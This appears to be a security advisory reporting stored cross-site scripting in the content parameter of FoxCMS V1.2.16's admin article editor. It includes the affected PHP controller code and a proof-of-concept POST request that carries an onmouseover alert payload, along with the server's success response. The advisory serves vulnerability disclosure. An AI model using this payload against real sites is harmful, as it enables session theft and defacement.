FoxCMS - Cross Site Scripting on (app/admin/controller/Article.php content parameter) 

Vendor Homepage:
```
https://gitee.com/qianfox/foxcms
```

Version: 

```
V1.2.16
```

Tested on: 

```
PHP, Nignx, MySQL
```

Affected Page:

```
app/admin/controller/Article.php
```

On this page, content parameter is vulnerable to Cross Site Scripting

```
public function edit()
    {
        $param = $this->request->param();

        $bcid = $param['bcid'];
        View::assign('bcid', $bcid);
        $ids = explode('_', $bcid);
        $columnId = $ids[sizeof($ids) - 1]; //栏目id
        $column = Column::find($columnId);
        if (!empty($column->tier)) {
            $bcidStr = '4_' . str_replace(",", "_", $column->tier);
        } else {
            $bcidStr = '4';
        }
        $breadcrumb = Column::getBreadcrumb($bcidStr);
        array_push($breadcrumb, ['id' => '', 'title' => '编辑文章', 'name' => DIRECTORY_SEPARATOR . config('adminconfig.admin_path') . '/Article/edit', 'url' => 'javascript:void(0)']);
        View::assign("breadcrumb", $breadcrumb);

        View::assign('id', $param['id']);
        if (array_key_exists('id', $param)) {
            $article = \app\common\model\Article::find($param['id']);
            $articleFieldList = $this->getAttrListAttr($article->article_field);
            View::assign('articleFieldList', $articleFieldList);
            View::assign('article', $article);
        }
        if ($this->request->isAjax()) {
            if (array_key_exists("content", $param)) {
                $rdata = $this->replaceContent($param, 'content'); //替换内容
                if ($rdata["code"] == 0) {
                    $this->error($rdata['msg']);
                }
                $param['content'] = $rdata['content']; //替换内容
            }

            $tags = $param["tags"];
            if (!empty($tags)) { //文档标签
                $this->addTags($tags);
            }
            $param['lang'] = $this->getMyLang();

            $fc = \app\common\model\Article::field("id,create_time,update_time")->find($param['id']);
            if ($fc) {
                if (empty($fc['create_time'])) {
                    $param['create_time'] = date('Y-m-d H:i:s', time());
                }
                if (empty($fc['update_time'])) {
                    $param['update_time'] = date('Y-m-d H:i:s', time());
                }
            } else {
                $this->error("抱歉没找到修改数据");
            }

            \app\common\model\Article::update($param);
            xn_add_admin_log("文章编辑", "article", $param['title']);
            $seo = xn_cfg("seo");
            if ($seo["url_model"] == 3) {
                $rparam =  ["columnId" => $param["column_id"], "oneId" => "key3", "first" => 1, "column_model" => "article", "id" => $param["id"]];
                $rparam = array_merge($rparam, $seo);
                $this->success('操作成功', "", $rparam);
            } else {
                $this->success('操作成功');
            }
        }
        return view();
    }
```

Function point location：

<img width="2878" height="1472" alt="image" src="https://github.com/user-attachments/assets/465f3e64-8bf8-4d79-acff-b7c44ff3e03b" />


Request:

```
POST /index.php/admin4435/Article/edit.html HTTP/1.1
Host: www.foxcms.cms
Content-Length: 308
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://www.foxcms.cms
Referer: http://www.foxcms.cms/index.php/admin4435/Article/edit.html?type=1&bcid=2_11&id=105
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=7c8341b30311677309e6835915d1b2c9; access_127_0_0_1=1761129226
Connection: close

id=105&title=test-xss4&brief_title=&article_field=&column_id=11&column=%E4%BC%81%E4%B8%9A%E5%8A%A8%E6%80%81&breviary_pic_id=&keywords=&description=&article_source=&author=&team_status=%2C&content=%3Cp%3E%26lt%3Binput+onmouseover%3Dalert(1)+%2F%26gt%3B%3C%2Fp%3E&release_time=2025-10-21+18%3A05&click=49&tags=
```

Response:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Wed, 22 Oct 2025 13:08:01 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: PHP/7.3.4
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 1800
Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-CSRF-TOKEN, X-Requested-With
Access-Control-Allow-Origin: http://www.foxcms.cms
Set-Cookie: PHPSESSID=7c8341b30311677309e6835915d1b2c9; expires=Thu, 23-Oct-2025 13:08:01 GMT; Max-Age=86400; path=/
Content-Length: 59

{"code":1,"msg":"操作成功","data":"","url":"","wait":1}
```
<img width="2878" height="1632" alt="image" src="https://github.com/user-attachments/assets/ae6225cf-6fa6-494b-a9b8-15d93fe53ba4" />

